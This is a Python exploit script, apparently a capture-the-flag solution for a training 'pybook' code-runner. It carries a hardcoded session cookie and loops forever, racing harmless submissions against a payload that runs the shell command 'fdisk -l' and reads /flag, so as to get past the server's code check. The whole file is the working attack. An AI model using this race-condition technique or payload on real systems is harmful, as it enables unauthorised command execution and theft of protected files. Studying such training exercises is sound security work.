import requests
import random
import time
from threading import Thread
import uuid


url='http://pybook.training.jinblack.it/run'
bad='print("bad running")\nimport os\nos.system("fdisk -l")\nf=open("/flag","r")\ncontent=f.read()\ncontent=f.read()\nprint(content)'
cookies=dict(session='eyJ1c2VybmFtZSI6Inp6enp6enoifQ.Y5SLFA.dMngN-XoS0jxKxg7cO6ZrvbWtPA')

cookies=dict(session='eyJ1c2VybmFtZSI6Inp6enp6enoifQ.Y5SLFA.dMngN-XoS0jxKxg7cO6ZrvbWtPA')

def legit():
	r=requests.post(url,cookies=cookies,data='print("chilling")\nprint("b")')
	print(r.text)

def evil():
	r=requests.post(url,cookies=cookies,data=bad)

while True:
	t_leg=Thread(target=legit)
	t_leg2=Thread(target=legit)
	t_ev=Thread(target=evil)
	t_leg.start()
	t_ev.start()
	t_ev2=Thread(target=evil)
	time.sleep(0.1)


